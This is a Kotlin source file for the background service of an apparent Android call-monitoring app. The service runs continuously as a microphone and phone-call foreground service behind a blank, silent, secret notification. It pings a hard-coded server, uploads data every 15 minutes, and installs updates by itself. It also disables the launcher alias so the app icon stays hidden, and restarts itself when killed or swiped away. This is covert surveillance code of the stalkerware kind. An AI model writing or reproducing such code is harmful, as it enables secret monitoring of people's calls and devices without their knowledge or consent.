package com.callmonitor.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.preference.PreferenceManager
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.callmonitor.CallMonitorApp
import com.callmonitor.MainActivity
import com.callmonitor.R
import com.callmonitor.update.UpdateManager
import com.callmonitor.upload.UploadWorker
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

/**
 * Background service that runs continuously to:
 * 1. Keep the app alive for call detection
 * 2. Ping the server every 30 seconds
 * 3. Trigger uploads when server is available
 * 4. Maintain hidden state after updates
 */
class BackgroundService : Service() {

    companion object {
        private const val TAG = "BackgroundService"
        private const val NOTIFICATION_ID = 2001
        private const val SERVER_URL = "http://192.168.0.104:8000"
        private const val PING_INTERVAL_MS = 30_000L // 30 seconds
        private const val PREF_APP_HIDDEN = "app_hidden"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pingJob: Job? = null
    private var isServerOnline = false
    private var lastUpdateCheck = 0L
    private val updateManager by lazy { UpdateManager(this) }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "BackgroundService created")
        startForegroundWithNotification()
        startPingLoop()
        schedulePeriodicUpload()
        ensureHiddenState() // Re-apply hidden state after updates
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "BackgroundService started")
        return START_STICKY // Restart if killed
    }

    private fun startForegroundWithNotification() {
        val notification = createNotification()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_PHONE_CALL
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CallMonitorApp.CHANNEL_ID_SERVICE)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_lock_silent_mode)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun startPingLoop() {
        pingJob?.cancel()
        pingJob = serviceScope.launch {
            while (isActive) {
                try {
                    val online = pingServer()
                    if (online != isServerOnline) {
                        isServerOnline = online
                        val status = if (online) "ONLINE" else "OFFLINE"
                        Log.d(TAG, "Server status changed: $status")
                        
                        if (online) {
                            // Server came online - trigger upload
                            triggerUpload()
                            // Check for updates (once per hour)
                            checkForUpdates()
                        }
                    }
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Ping error", e)
                    isServerOnline = false
                }
                
                delay(PING_INTERVAL_MS)
            }
        }
    }

    private suspend fun pingServer(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("$SERVER_URL/health")
                val connection = url.openConnection() as HttpURLConnection
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.requestMethod = "GET"
                
                val responseCode = connection.responseCode
                connection.disconnect()
                
                responseCode == 200
            } catch (e: Exception) {
                Log.d(TAG, "Server ping failed: ${e.message}")
                false
            }
        }
    }

    private fun triggerUpload() {
        val uploadRequest = OneTimeWorkRequestBuilder<UploadWorker>()
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()
        WorkManager.getInstance(this).enqueue(uploadRequest)
        Log.d(TAG, "Upload triggered")
    }

    private fun checkForUpdates() {
        // Only check once per hour
        val now = System.currentTimeMillis()
        if (now - lastUpdateCheck < 3600_000) return
        lastUpdateCheck = now

        serviceScope.launch {
            try {
                val updateInfo = updateManager.checkForUpdate()
                if (updateInfo != null && updateInfo.hasUpdate) {
                    Log.d(TAG, "Update available: ${updateInfo.versionName}")
                    updateManager.downloadAndInstall()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Update check failed", e)
            }
        }
    }

    private fun schedulePeriodicUpload() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        // Upload every 15 minutes
        val uploadRequest = PeriodicWorkRequestBuilder<UploadWorker>(
            15, TimeUnit.MINUTES
        )
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "periodic_upload",
            ExistingPeriodicWorkPolicy.KEEP,
            uploadRequest
        )
    }

    /**
     * Ensures the app remains hidden after OTA updates.
     * When an update is installed, the component state might reset,
     * so we re-apply the hidden state based on saved preference.
     */
    private fun ensureHiddenState() {
        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val isHidden = prefs.getBoolean(PREF_APP_HIDDEN, false)
        
        if (isHidden) {
            try {
                val componentName = ComponentName(this, "com.callmonitor.LauncherAlias")
                val currentState = packageManager.getComponentEnabledSetting(componentName)
                
                // If not already disabled, disable it
                if (currentState != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Log.d(TAG, "Re-applied hidden state after update")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to ensure hidden state", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pingJob?.cancel()
        serviceScope.cancel()
        Log.d(TAG, "BackgroundService destroyed")
        
        // Restart the service
        val restartIntent = Intent(this, BackgroundService::class.java)
        startService(restartIntent)
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Restart when app is swiped away
        val restartIntent = Intent(this, BackgroundService::class.java)
        startService(restartIntent)
    }
}
